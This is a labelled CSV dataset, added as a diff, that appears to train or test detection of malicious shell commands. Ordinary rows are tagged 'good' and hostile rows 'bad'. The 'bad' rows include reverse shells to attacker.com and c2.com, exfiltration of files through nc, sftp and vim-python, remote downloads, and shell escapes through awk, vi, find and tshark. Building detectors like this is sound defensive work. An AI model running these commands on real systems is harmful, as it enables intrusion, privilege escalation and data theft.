@@ -1,0 +1,864 @@
+commands,tag
+find \! -name . -type d -print0 | xargs -0 rmdir,good
+ssh app1,good
+"find . -type d -name ""cpp"" -exec find {} -type f \;",good
+find $directory -type f,good
+find . -name .svn -exec rm -rf {} \;,good
+echo 'abcdefg'|tail -c +2|head -c 3,good
+file_changed=$(find . -depth \( -wholename \./\.\* \) -prune -o -mtime -1 -print | cpio -oav),good
+find . -name 'kt[0-9] ',good
+read -a first,good
+"find . \! -name ""*.Z"" -exec compress -f {} \;",good
+ping -a 10.100.3.104,good
+"find . -name ""*failed.ipynb"" | cpio -pd ./fails",good
+find images/ -type f,good
+find -name whatever -exec grep --with-filename you_search_for_it {} \;,good
+find /home/kibab -name '*.png' -exec echo '{}' ';',good
+OUTPUT=`top -b -n 1 | tail -n +8 | head -n 1`,good
+curl http://example.com/,good
+find ~/junk  -name 'cart[4-6]' -exec rm {}  \;,good
+cal -h | cut -c 4-17 | tail -n +3,good
+cat infile | od -c,good
+find /home/calvin/ -iname “picasso”,good
+"echo 'hello, world' | cat",good
+"RHOST=user@attacker.com
+sftp $RHOST
+put file_to_send file_to_save",bad
+"bind '""e"":self-insert'",good
+"join -t, -a1 -a2 <(sort file1) <(sort file2)",good
+find / -perm -644,good
+"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null",bad
+find . -type d -name .svn -prune -o -print,good
+"history -s 'echo whatever you ""want your"" command to be'",good
+du -sh */ | sort -n,good
+env -i perl -V,good
+column -t file | uniq -w12 -c,good
+myVar=$(tee),good
+"export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'",bad
+find /dir -amin -60,good
+find /path -type f,good
+vimdiff file_to_read,bad
+fish,bad
+nl file | sort -nr | cut -b8-,good
+"find /home/folder1/*.txt -type f -exec ln -s {} ""folder2_"" + \;",good
+"ps -A -o pid | xargs -I pid readlink ""/proc/pid/exe"" | xargs -I file dirname ""file""",good
+shopt -s dotglob,good
+find /tmp/foo -path /tmp/foo/bar -print /tmp/foo/bar,good
+diff -ENwbur repos1/ repos2/,good
+"LFILE=file_to_read
+xpad -f ""$LFILE""",bad
+"find /storage -name ""*.mp4"" -o -name ""*.flv"" -type f | sort | head -n500",good
+pdftex --shell-escape '\write18{/bin/sh}\end',bad
+find / -empty,good
+find /tmp /var/tmp -size +30M -mtime 31 -ls,good
+find bills -type f -execdir sort -o '{}.sorted' '{}' ';',good
+mount -n -o remount /,good
+find /path/to/dir -type d -exec chmod 755 {} \;,good
+shopt -s nocasematch,good
+sudo chmod -R 777 theDirectory/,good
+"find . -type f -newermt ""$date_time""",good
+"ln -s ""../config/environments""",good
+"find \( -name 'messages.*' ! -path ""*/.svn/*"" ! -path ""*/CVS/*"" \) -exec grep -Iw uint {} +",good
+tee /tmp/arjhaiX4,good
+"ln -s ""$(find dir -name '*.jpg')"" .",good
+mv `ls *.boo` subdir,good
+find . -type f -exec grep -o aaa {} \; | wc -l,good
+find * -maxdepth 0 -name 'b' -prune -o -exec rm -rf '{}' ';',good
+find /home/hobbes/ /home/calvin/ -name “*.txt”,good
+"find . -name ""sample*"" | xargs -i echo program {}-out {}",good
+"TF=$(mktemp)
+echo DATA >$TF
+split -b999m $TF",bad
+"find . -type f ! \( -name ""*gz"" -o -name ""*tmp"" -o -name ""*xftp"" \) -exec gzip -n '{}' \;",good
+fif2=$(mktemp -u),good
+find /var/www -name *.gif -size +5k -size -10k,good
+file `which python`,good
+find -name file1,good
+cat 1.txt | xargs dig TXT,good
+"read -p "" Enter Here : "" text",good
+"$(readlink -f $(dirname ""$0""))",good
+find . -amin -1,good
+find /tmp -name core -type f -print0 | xargs -0 /bin/rm -i,good
+find /book -print | xargs grep '[Nn] utshell',good
+find . -path ./dir1  -prune -o -print,good
+"find -name ""*.txt"" -exec mv {} `basename {} .htm`.html \;",good
+rm -r bin/node bin/node-waf include/node lib/node lib/pkgconfig/nodejs.pc share/man/man1/node.1,good
+df -h .,good
+echo $(cat /proc/$$/cmdline),good
+extract_dir=$(tar -tf $FILE | cut -d/ -f1 | uniq),good
+echo aa | wc -l | tr -d ' ',good
+ln -s www1 www,good
+find -ipath './projects/insanewebproject'| head -n1,good
+which python,good
+chmod -R 777 ../tools,good
+echo $(basename $(dirname $(dirname $pathname))),good
+"echo ""0a.00.1 usb controller some text device 4dc9"" | rev | cut -b1-4 | rev",good
+"find $FOLDER -name "".*"" -delete",good
+"LFILE=file_to_delete
+c89 -xc /dev/null -o $LFILE",bad
+find htdocs -type d -exec chmod 775 {} +,good
+find / -user seamstress -iname “*.pdf”,good
+find ~ -name myfile,good
+find / -path excluded_path -prune -o -type f -name myfile -print,good
+find . -name '.git' | xargs -n 1 dirname,good
+sg $(id -ng),bad
+thisHOSTNAME=`hostname`,good
+"find -iname ""*.jpg""",good
+"find olddir -name script.sh -printf ""%p\0"" -printf ""newdir/%P\0"" | xargs -0L2 cp -n",good
+"find . -type d -exec chmod u=rwx,g=rx,o=rx {} \;",good
+rmdir nonsense_dir,good
+"find . -name ""*:*""",good
+find ./ -name *.undo | xargs wc,good
+"ifconfig en0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'",good
+find test -empty,good
+find xargstest/ -name 'file??',good
+"find /tmp -name ""*.tmp"" -print0 | xargs -0 rm   find /tmp -name ""*.tmp"" -print0 | xargs -0 rm",good
+find test1 -type f -print,good
+find ~ -group vboxusers -exec chown kent:kent {} \;,good
+chown -R $1:httpd *,good
+find -mindepth 1 -maxdepth 1,good
+find . -name '*.php' -exec chmod 755 {} \; | tee logfile.txt,good
+hostname myServersHostname,good
+chmod 644 `find . -type f`,good
+cat my_script.py,good
+find -daystart -mtime +0,good
+tmpdir=$(mktemp -d),good
+find . -name [ab]* -print,good
+find . -type f -name '*.zip' -print0 | xargs -0 tar -xzf,good
+cd `find . -name file.xml -exec dirname {} \;`,good
+"echo -e ""\n\n\n"" | ssh-keygen -t rsa",good
+find . \! -name BBB -print,good
+"find /foo -name ""*.txt"" -exec du -hc {} + | tail -n1",good
+chgrp -R project_dev /home/user1/project/dev,good
+tree -L 2 -fi,good
+"find . -name ""*.c"" -print | xargs grep ""main(""",good
+find . -name '*.java' -mtime +7 -print,good
+chown user1:user1 -R subdir1,good
+"chown -- ""$user:$group"" ""$file""",good
+find . -name “*.[php|PHP]” -print,good
+sleep 5,good
+mkdir subdirectory,good
+"find . -type f \( -name ""*.pas"" -o -name ""*.dfm"" \) -print0 | xargs --null grep --with-filename --line-number --no-messages --color --ignore-case ""searchtext""",good
+find . -type l -exec ls -l {} \;,good
+find /home/peter -name *~ -print0 |xargs -0 rm,good
+"ls | tr  ""\n"" "" """,good
+"find . -type d -exec rename 's/^thumbs$/thumb/' {} "";""",good
+sudo chown -R :laravel ./storage,good
+find /home/username/public_html/sites/all/modules -type f -exec chmod 640 {} +,good
+find  /var -path */l??/samba*,good
+sort -m *.txt | split -d -l 1000000 - output,good
+ssh -f user@gateway -L 3307:1.2.3.4:3306 -N,good
+find -E /somefolder -type f -iregex '\./(.*\.error.*|second.*log|.*FFPC\.log)$',good
+libdir=$(dirname $(dirname $(which gcc)))/lib,good
+"find . -type f -name ""*.php"" -exec wc -l {} +;",good
+"find /var/log/apache2/access*.gz -type f -newer ./tmpoldfile ! -newer ./tmpnewfile \ | xargs zcat | grep -E ""$MONTH\/$YEAR.*GET.*ad=$ADVERTISER HTTP\/1"" -c",good
+find dir -depth,good
+wc -l file,good
+absolute_path=$(readlink -m /home/nohsib/dvc/../bop),good
+"LFILE='\path\to\file_to_read'
+dosbox -c 'mount c /' -c ""type c:$LFILE""",bad
+"read -p ""Continue (y/n)?"" choice",good
+find . -size +1M -exec mv {} files \+,good
+"find -path ""*/test/*"" -delete",good
+sudo find . -type f -exec chmod 644 {} +,good
+"awk 'BEGIN {system(""/bin/sh"")}'",bad
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect c2.com:4444 > /tmp/s; rm /tmp/s,bad
+"find . -type f -name ""*.tex""",good
+rm -v *.bak,good
+md5 -s 'string to be hashed',good
+"find . -name ""accepted_hits.bam""",good
+find $dir -type -f size +$size -print0 | xargs -0 ls -1hsS,good
+"find $FOLDER -name "".*""",good
+find /DIR -type f -print0 | tr -dc '\0' | wc -c,good
+find . -name '*',good
+df -k /dir/inner_dir/,good
+find /Users -type d -iname '*.bak' -print0 | xargs -0 rmdir,good
+find . -name 'filename' | xargs -r ls -tc | head -n1,good
+watch -n 5 wget -qO-  http://fake.link/file.txt,good
+seq -s' ' $start $end,good
+grep -f file2 file1 | sort -u,good
+"find -iname ""*.c""",good
+find /srv/abc/ -type d -empty -exec rmdir {} \;,good
+find /home -size +200M -exec ls -sh {} \;,good
+chgrp,good
+find dir -name '?????????????????????????????????',good
+find /home -name tecmint.txt,good
+hostname=`hostname -s`,good
+ssh -fNT -L8888:proxyhost:8888 -R22222:localhost:22 officefirewall,good
+find /home/folder1/*.txt -type f -exec ln -s {} \;,good
+"bconsole
+@exec /bin/sh",bad
+"find /usr/src -name ""*.html"" -execdir /usr/bin/grep -H ""foo"" {} ';' | wc -l",good
+rsync symdir/ symdir_output/ -a --copy-links -v,good
+"find A \! -path ""A/a/*""",good
+find . -exec /bin/sh \; -quit,bad
+find /somePath -type d -name ‘someNamePrefix*’ -mtime +10 -print | xargs rm -rf ;,good
+"find /usr -name ""*.c""",good
+"find . -name ""*.pyc"" | xargs -0 rm -rf",good
+"find Música/* -type f -name "".*"" -exec ls -l {} \;",good
+"find . -name ""*.xml"" -exec grep ""ERROR"" /dev/null '{}' \+",good
+"export LFILE=file_to_read
+elvish -c 'echo (slurp <$E:LFILE)'",bad
+julia -e 'run(`/bin/sh`)',bad
+mv * /tmp/blah/,good
+find arch/x86/usr/sbin arch/x86/usr/X11R6/bin usr/sbin/ -type f | xargs chmod a+x,good
+find /home/my_dir -name '*.txt' | xargs grep -c ^.*,good
+"find . -name ""*.rb"" -type f | xargs -I {} echo Hello, {} !",good
+aoss /bin/sh,bad
+find . \( -type d -name '.svn' -o -type f -name '*.html' \) -prune -o -print0,good
+find . -name '*.mov',good
+cat /proc/1/sched  | head -n 1,good
+"find . -name ""new*.sh"" -exec rm -f '{}' \;",good
+seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------') **...**,good
+mkdir ~/log,good
+find /usr /bin /sbin /opt -name sar,good
+find /var/log -daystart -mtime 0,good
+ssh -f user@gateway -p 24222 -L 3307:1.2.3.4:3306 -N,good
+"find . -name ""*.bam""",good
+find / -name 'top???',good
+"export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+rview -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e[""URL""], e[""LFILE""])
+vim.command("":q!"")'",bad
+"RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+nc $RHOST $RPORT < ""$LFILE""",bad
+"find /path/to/dir -type f | xargs grep -l ""foo""",good
+curl https://raw.github.com/creationix/nvm/master/install.sh | sh,good
+od -t x2 -N 1000 $file | cut -c8- | egrep -m1 -q ' 0d| 0d|0d$',good
+find / -ctime -1,good
+cat /proc/17709/cmdline | xargs -0 echo,good
+"find .  ! -regex "".*[/]\.svn[/]?.*""",good
+mount /path/to/device /path/to/mount/location -o loop -t vfat,good
+"find . -name ""*.html"" -print | xargs -l -i wc {}",good
+fhost=`hostname -f`,good
+find . -type f -name tecmint.php,good
+ls | read var,good
+find sourceDir -mindepth 1 -maxdepth 1 -exec mv --target-directory=destDir '{}' +,good
+"LFILE=file_to_read
+paste $LFILE",bad
+"echo `ls` ""`cal`""",good
+"find . -mtime -1 -type f -print0 | xargs -0 tar rvf ""$archive.tar""",good
+tr  ' ' '-',good
+find / -type d  -perm 777 -print -exec chmod 755 {} \;,good
+tail -n +11 /tmp/myfile,good
+find . -size -1c -print,good
+real1=$(pwd -P),good
+"find / -type d -name ""ora10*""",good
+"cd ""$(grep DOWNLOAD $HOME/.config/user-dirs.dirs | cut -f 2 -d ""="" | tr ""\"""" ""\n"")""",good
+"find . \( \( -path ""\.?.*"" -type d \) -o -path ""*normal*"" \) -prune -o \( -type f \) -print",good
+find /mnt/naspath \! \(-name .snapshot -prune\) -type f -mtime 0 -print0,good
+paste <(cal 2 2009) <(cal 3 2009) <(cal 4 2009),good
+find / -name filename.txt -print,good
+find . -name '*1234.56789*',good
+tar czf - www|split -b 1073741824 - www-backup.tar.,good
+find . -type f -exec grep -i California {} \; -print | wc -l,good
+find demo -depth -name .git -prune -o -print0 | cpio -0pdv --quiet demo_bkp,good
+mkdir -m 777 dirname,good
+find . -type f -name '*.DS_Store' -ls -delete,good
+"export URL=http://attacker.com/
+export LFILE=file_to_send
+view -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))
+vim.command("":q!"")'",bad
+find . -maxdepth 1 -empty,good
+ssh -i id_rsa host,good
+find -newermt yesterday -ls,good
+find . — size +1000k -print,good
+"find / -name ""*.dbf""",good
+"find . -name ""*.txt"" -ok rm {} \;",good
+FILES=`cat $RAW_LOG_DIR | xargs -r`,good
+find /home/user/demo -type f -print,good
+df -BG,good
+find . -type f -perm 755,good
+"export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'",bad
+find ~/tmp -mtime 0 -exec du -ks {} \; | cut -f1,good
+find -name '*macs',good
+find . \( -name '*.txt' -o -name '*.html' \) -mtime +5 -print0,good
+"ls -l $(find /etc -name ""*.txt"" )",good
+find /tmp/ -ctime -1 -name x*,good
+"LFILE=file_to_read
+tic -C ""$LFILE""",bad
+find . -type f -empty -print0 | xargs -0 /bin/rm,good
+ssh-keygen -t rsa,good
+rsync -avz tata/ tata2/,good
+jobs -p | xargs kill -9,good
+cat files.txt | xargs scp user@remote:,good
+find ${userdir}/${i}/incoming -mtime +2 -type f -ls,good
+"find -P .  -maxdepth 1 -type l -exec echo -n ""{} -> "" \; -exec readlink {} \;",good
+cat text,good
+"cat <(crontab -l) <(echo ""1 2 3 4 5 scripty.sh"") | crontab -",good
+"mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system",good
+read -n1,good
+find /data/bin/test -type d -mtime +10 -name '[0-9]*' -print | xargs rm -rf ;,good
+"cd `find . -name ""config""`",good
+chmod 755 $(find /path/to/base/dir -type d),good
+"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'",bad
+rsync -avR foo/bar/baz.c remote:/tmp/,good
+"find -type f -name ""*.htm""",good
+"find . -type f -name "".*""",good
+"find /volume1/uploads -name ""*.mkv"" -exec rename 's/\.mkv$/.avi/' \{\} \;",good
+"octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'",bad
+"find /var  -type f -exec grep ""param1"" {} \; -print",good
+read -rsp $'Press enter to continue...\n',good
+"size=""$(zcat ""$file"" | wc -c)""",good
+ssh-keygen -f outfile -N '',good
+"echo ""* * * * * touch $(pwd)/washere1"" | crontab",good
+find / -type f -exec grep -i 'the brown dog' {} +;,good
+"export LPORT=8888
+vim -c ':py import vim,sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()
+vim.command("":q!"")'",bad
+find $@ -not -name ss,good
+find . -type f -not -name '.*' -mtime +500 -exec ls {} \;,good
+rsync -az --delete /mnt/data/ /media/WD_Disk_1/current_working_data/;,good
+find . -type d -exec chown username {} \;,good
+find . ! -readable -prune,good
+"find -name ""*.gz"" | wc -l",good
+find your/dir -prune -empty -type d,good
+"find . -name '*bills*' -exec grep -H ""put"" {} \;",good
+"LFILE=file_to_read
+TF=$(mktemp -d)
+echo ""$LFILE"" | cpio -dp $TF
+cat ""$TF/$LFILE""",bad
+"join -j1 -o 2.1,2.2,1.2,1.3  <(sort test.1) <(sort test.2)",good
+find . -name '*.code' -exec grep -H 'pattern' {} +,good
+find /nfs/office -name .user.log -print,good
+find /mnt/raid/upload -mtime -7 -print,good
+"find . \( -name ""*.c"" -or -name ""*.cpp"" -or -name ""*.h"" -or -name ""*.m"" -or -name '*.java' \) -print0 | xargs -0 wc",good
+"DATECOMING=$(echo `date -d ""20131220"" +%j`)",good
+find /home -type f -name *.sxw -atime -3 -user bruno,good
+find . -name \*.php -type f -print0 | xargs -0 -n1 grep -Hn '$test',good
+find . -name Makefile -print0 | xargs -0 grep -nH $ | grep :235:,good
+find . -type f -exec basename {} \;,good
+find /home/ABCD/ -mindepth 1 -type f -print,good
+find ~ -iname '*.tex',good
+find /home/ -type f -size +512k -exec ls -lh {} \;,good
+chgrp god public private,good
+find $1/.hg -type d -exec chmod g+s {} \;,good
+"find . -type f -name ""*searched phrasse*"" ! -path ""./tmp/*"" ! -path ""./var/log/*""",good
+find $STARTDIR -name '*.ps' -print,good
+find . -name '*.scm',good
+find ./ -daystart -mtime +3,good
+find ~ -type f -mtime 0 -ls,good
+"find ""${searchpath}"" -type f -print0 | xargs -0 grep -l -E ""${string1}"".*""${string2}"".*""${string3}""",good
+"find . -type f -regex "".+-[0-9]+x[0-9]+\.jpg"" -exec rm -rf {} \;",good
+"find . -name ""$1"" -type f -print0 | xargs -0 grep -i ""$2""",good
+rsync -vuar --delete-after path/subfolder/ path/,good
+rmdir ed*,good
+find ~ -used +365 -ok rm '{}' ';',good
+find . -type f -print0 | xargs -0 chmod 664,good
+"t1=$(date -u -d ""1970.01.01-$string1"" +""%s"")",good
+find . -type f -mtime 0,good
+"find /home/backups -printf ""%T@ %p\n"" | sort -n | head -1 | cut -d"" "" -f2- | xargs ls -al",good
+full_backup_dir=$(find . -depth \( -wholename \./\.\* \) -prune -o -mtime -1 -print),good
+split --bytes=1500000000 abc.txt abc,good
+"mount /media/Working/ -oremount,umask=000",good
+find . -empty -exec rm '{}' \;,good
+find / -perm 2644,good
+find . -name '*.js' -\! -name 'glob-for-excluded-dir' -prune,good
+"echo ""$line"" | column -t",good
+"md5sum ""$source_file"" ""$dest_file""",good
+"ln -f '/home/user/Musik/mix-2012-13/aesthesys~ I Am Free, That Is Why I'""'""'m Lost..mp3' '/home/user/Musik/youtube converted/aesthesys~ I Am Free, That Is Why I'""'""'m Lost..mp3'",good
+find /data/images -type f -newer /tmp/start -not -newer /tmp/end,good
+sort --merge file*.txt | split -l 100000 - sorted_file,good
+find /etc -newer /etc/motd,good
+ls -d -1 $PWD/*.*,good
+"find . -iname ""needle""",good
+find /var/log,good
+find . -type f -exec chown username {} \;,good
+"LFILE=/tmp/file_to_read
+curl file://$LFILE",bad
+"grep -rnw `pwd` -e ""pattern""",good
+find . -type f | grep -o -E '\.[^\.]+$' | sort -u,good
+"find -L /path/to/dir/* -printf ""%TY%Tm%Td%TH%TM%TS|%p\n""",good
+rsync -av /path/to/files user@targethost:/path,good
+su -l builder,good
+"find . -name '*[+{;""\\=?~()<>&*|$ ]*' -maxdepth 0 -exec rm -f '{}' \;",good
+echo <(yes),good
+find . -name \*.php -type f -print0 | xargs -0 -n1 grep -Hn '$test' | wc -l,good
+top -p 18884 -p 18892 -p 18919,good
+"find -name ""query""",good
+"export LFILE=file_to_read
+php -r 'readfile(getenv(""LFILE""));'",bad
+"find /nas/projects/mgmt/scripts/perl -mtime 8 -mtime -10 -daystart -iname ""*.pl""",good
+"rmdir ""$(dirname $dir)""",good
+find / -name 'top*',good
+find . -follow -inum 41525360,good
+"find . -iname ""{EA,FS}_*""",good
+kill -9 18581 18582 18583,good
+chgrp pub public,good
+mktemp /tmp/banana.XXXXXXXXXXXXXXXXXXXXXXX.mp3,good
+find /media/New\ Volume/bhajans -maxdepth 1 -type d | xargs -0 mkdir -p,good
+cd $(basename $1 .tar.gz),good
+find /path/to/files* -mtime +5 -exec rm {} \;,good
+ln -sfvn source target,good
+"read -r -p ""$(echo $@) ? [y/N] "" YESNO",good
+"export RHOST=attacker.com
+export RPORT=12345
+node -e 'sh = require(""child_process"").spawn(""/bin/sh"");
+require(""net"").connect(process.env.RPORT, process.env.RHOST, function () {
+  this.pipe(sh.stdin);
+  sh.stdout.pipe(this);
+  sh.stderr.pipe(this);
+})'",bad
+history | cut -c 8-,good
+find /home/ -mtime -1 \! -type d,good
+ls `which gcc` -al,good
+rename -n 's/special/regular/' **,good
+find . -name *.o -perm 664 -print,good
+"echo ""$(date +%H:%M:%S): done waiting. both jobs terminated on their own or via timeout; resuming script""",good
+"find . -name ""*.swp""-exec rm -rf {} \;",good
+"find . -name ""octave"" -type d",good
+"TF=$(mktemp)
+echo 'os.execute(""/bin/sh"")' >$TF
+tshark -Xlua_script:$TF",bad
+TESTVAR=bbb env | fgrep TESTVAR,good
+find -L /home/peter -name *~ |xargs rm,good
+find test -depth -empty -delete,good
+yes | tr \\n x | head -c $BYTES | grep n,good
+tail -1 <(sort set),good
+"find . -name ""*.txt"" -type f -print | xargs file | grep ""foo="" | cut -d: -f1",good
+find  . -type d -mindepth 1 -print -exec chmod 755 {}/* \;,good
+find / -user vivek,good
+"find . -prune -name ""*.dat""  -type f -cmin +60 |xargs -i basename {} \;",good
+find . -exec grep -H string-to-find {} \;,good
+"basename -a ""${alpha[@]}""",good
+"find . -name ""*.tex""",good
+full_backup_dir=$(find . -depth '(' -wholename './.*' ')' -prune -o -print),good
+"export LFILE=file_to_write
+dash -c 'echo DATA > $LFILE'",bad
+find / -name composer.json,good
+find . -mtime -14 -print|xargs -i rm \;,good
+"find ""$DIR"" -type f -atime +5 -exec rm {} \;",good
+find /home/bozo/projects -mtime 1,good
+"find . -name ""*.zip"" -mtime +2 orint0 | xargs -0 rm",good
+find . -atime 7 -print,good
+basename $(pwd),good
+"find . -name ""*.trc"" -ctime +3 -exec ls -l {} \;",good
+find ~/src -newer main.css,good
+find . -type f |wc -l,good
+"export LFILE=/tmp/file_to_save
+TF=$(mktemp -d)
+echo ""import os;
+os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py
+easy_install $TF",bad
+find /path -type f | sort -u | xargs cat | md5sum,good
+"find . -name ""*.css"" -exec grep -l ""#content"" {} \;",good
+chgrp loggroup logdir,good
+find /folder/of/stuff -type f | sort,good
+find -mmin 1 -print,good
+"proc_load_average=`w | head -1 | cut -d"" "" -f13 | cut -d"","" -f1-2 | tr ',' '.'`",good
+"man man
+!/bin/sh",bad
+"find ./ -name ""blabla"" -exec wc -l {} ;",good
+find  | rename 's/\.jpg$/.jpeg/',good
+find /home/oracle /home/database -name '*zip*',good
+find . -type f -print0 | xargs -0 /bin/rm,good
+find / \( -name tmp -o -name '*.xx' \) -atime +7 -exec rm {} \;,good
+cp -n src dest,good
+find . -type d | xargs rmdir,good
+find . -user root -perm -4000 -print,good
+find tmp -maxdepth 1 -name *.mp3 -print0 | xargs -0 rm,good
+"find /travelphotos -type f -size +200k -not -iname ""*2015*""",good
+find \( -name '*.cpp' -o -name '*.h' \) -print,good
+"fold -b -w 20 | cut --output-delimiter $'\t' -b 1-3,4-10,11-20",good
+"find . -path ""./foo"" -prune -o -path ""./bar"" -prune -o -type f -name ""*.html""",good
+script -q -c 'echo DATA' file_to_write,bad
+find / -user syslog,good
+"read -n 1 -p ""Is this a good question (y/n)? "" answer",good
+"find A -type d \( ! -wholename ""A/a/*"" \)",good
+`sudo chown -R mongodb:mongodb /data/*`,good
+"find ""$source_dir"" -type f -regex "".*\.\(avi\|wmv\|flv\|mp4\)"" -print0",good
+"find ""$somedir"" -type f -exec echo Found unexpected file {} \;",good
+"DATA=$( find ""${1}"" -type f -exec ${MD5} {} ';' | sort -n )",good
+find /etc/ -user root -mtime 1,good
+"TF=$(mktemp -d)
+echo 'system(""/bin/sh"")' > $TF/x
+gem build $TF/x",bad
+"find /var/log -name ""syslog"" -type d",good
+"LFILE=file_to_read
+dialog --textbox ""$LFILE"" 0 0",bad
+history 10 | cut -c 8-,good
+find / -maxdepth 3 -name passwd,good
+paste -d ' ' file <(rev file),good
+"vi
+:set shell=/bin/sh
+:shell",bad
+"find . -type d | xargs -I ""{x}"" mkdir ""{x}""/new-dir",good
+find /usr/bin -type f -mtime -10,good
+"export RHOST=attacker.com
+export RPORT=12345
+view -c ':lua local s=require(""socket""); local t=assert(s.tcp());
+  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
+  while true do
+    local r,x=t:receive();local f=assert(io.popen(r,""r""));
+    local b=assert(f:read(""*a""));t:send(b);
+  end;
+  f:close();t:close();'",bad
+"date -d ""yesterday 13:00"" '+%Y-%m-%d'",good
+find /tmp -type f \( -name '*.txt' \) |cut -c14- | nl,good
+find wordpress -name '*js',good
+find ~/clang+llvm-3.3/bin/ -type f -exec basename {} \; | xargs rm,good
+"find temps/ -name ""thumb.png""",good
+"date -d ""Oct 21 1973"" +%s",good
+mkdir -p es/LC_MESSAGES,good
+"pwd | grep -o ""\w*-*$""",good
+history -cr,good
+diff <(sort file1 -u) <(sort file2 -u),good
+cd `ls -d */ | grep 1670`,good
+find $dir_name -size $sizeFile -printf '%M %n %u %g %s %Tb %Td %Tk:%TM %p\n',good
+"LFILE=file_to_write
+sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'",bad
+"find . -regex "".*\.\(flv\|mp4\)"" -type f -printf '%T+ %p\n' | sort | head -n 500",good
+scp -P 2222 /absolute_path/source-folder/some-file user@example.com:/absolute_path/destination-folder,good
+find . -group X_GNAME -exec chgrp Y_GNAME {} +,good
+ln -sfn source_file_or_directory_name softlink_name,good
+"LFILE=file_to_read
+nl -bn -w1 -s '' $LFILE",bad
+"find ./ -type f -exec grep -l ""Text To Find"" {} \;",good
+"find . -name ""*rb"" -print0 | xargs -0 head -10000",good
+echo 'hi' | od -c,good
+find . -name FOLDER1 -prune -o -name filename,good
+find . -maxdepth 1 -type f -name '.*' -printf '%f\0',good
+find * -mtime -1 -daystart -print0 | cpio -pd0 ../changeset,good
+find .  -name .git -prune -o -type f -print,good
+"find /usr/share/data -regextype posix-extended -regex "".*/20140624.*"" -fprint /home/user/txt-files/data-as-of-20140624.txt",good
+"cp ""${FILE}"" ""COLLECT/$(mktemp job_XXXXXXXXX)""",good
+find /home/username/public_html/sites/default/files -type f -exec chmod 660 {} +,good
+find . -type d,good
+"find . -printf ""%y %p\n""",good
+BZIP2_CMD=`which bzip2`,good
+"find . -name ""*.sh"" -print0 | xargs -0 -I file mv file ~/back.scripts",good
+"ARGS=""--ignore `echo ${TO_IGNORE[@]} | tr ' ' ','`""",good
+"find /srv/www/*/htdocs/system/application/ -name ""*.php"" -exec grep -H ""debug ("" {} +",good
+find /etc -mtime -1,good
+"PROMPT_COMMAND='LAST=""`cat /tmp/x`""; exec >/dev/tty; exec > >(tee /tmp/x)'",good
+chmod g+w * ...*,good
+find / -name httpd.conf -newer /etc/apache-perl/httpd.conf,good
+"TF=$(mktemp -d)
+echo 'exec(""/bin/sh"")' > $TF/x.rb
+FACTERLIB=$TF facter",bad
+find /home /opt -name test.txt,good
+ping ${ip} -I eth9 -c 1,good
+"find /path -type f -name ""???-???_[a-zA-Z]*_[0-9]*_*.???""",good
+find /usr/spool/uucp -type d -print,good
+aa-exec /bin/sh,bad
+find 'Test Folder' -type d -print0 | xargs -0 rm -rf,good
+find / -nouser -nogroup,good
+shopt -s globstar nullglob,good
+scrot -e /bin/sh,bad
+mkdir -p ${raw_folder} ${split_folder},good
+ls | xargs rmdir,good
+"TF=$(mktemp -d)
+echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
+cobc -xFj --frelax-syntax-checks $TF/x",bad
+"nl -s""^M${LOGFILE}>  """,good
+find . -name CVS -prune -o -exec mv '{}' `echo {} | tr '[A-Z]' '[a-z]'` \; -print,good
+find . -type f -exec chgrp usergroup {} \;,good
+find /tmp -type f -empty,good
+find /your/dir -type f -exec touch {} +,good
+find -regex '.*/modules\(/.*\|$\)' \! -regex '.*/modules/.*/modules\(/.*\|$\)' -type d -links 2,good
+"find $d -type f -exec chmod ug=rw,o= '{}' \;",good
+"find /usr/ -path ""*local*""",good
+readlink -f `ls --dereference /proc/$pid/exe`,good
+rsync /dev/null node:existing-dir/new-dir/,good
+find -L /home/peter -name *~ -print0 |xargs -0 -r -n1000 rm,good
+"find . -type f -name ""*cache.html"" -exec gzip -k {} \;",good
+"find . -path ""*src/main*"" -type f -iname ""*\.scala*""",good
+sudo su -l oracle,good
+rsync -u -r --delete dir_a dir_b,good
+mkdir 3/foo 3/bar 3/baz,good
+"find . -name ""*.jpg"" -print0 | xargs -0 ls",good
+bash | tee /var/log/bash.out.log,good
+"result=""$(dig +short @""$server"" ""$domain"" | wc -l)""",good
+od -cAn;,good
+"find /etc -name ""*.conf"" -printf ""%f %a, %t\n""",good
+rsync -a --exclude .svn path/to/working/copy path/to/export,good
+cd -P ..,good
+"cd ""${dirs[-1]}""",good
+find -type type_descriptor,good
+"find . -name ""file2015-0*""",good
+find . -name file1 -or -name file9,good
+ansible-test shell,bad
+"cat searches.txt| xargs -I {} -d, -n 1 grep  -r {}",good
+find /var -name lighttpd,good
+find /home/david -amin -10 -name '*.c',good
+"zcat file.gz | cut -f1 -d, | sort | uniq -c | sort -n",good
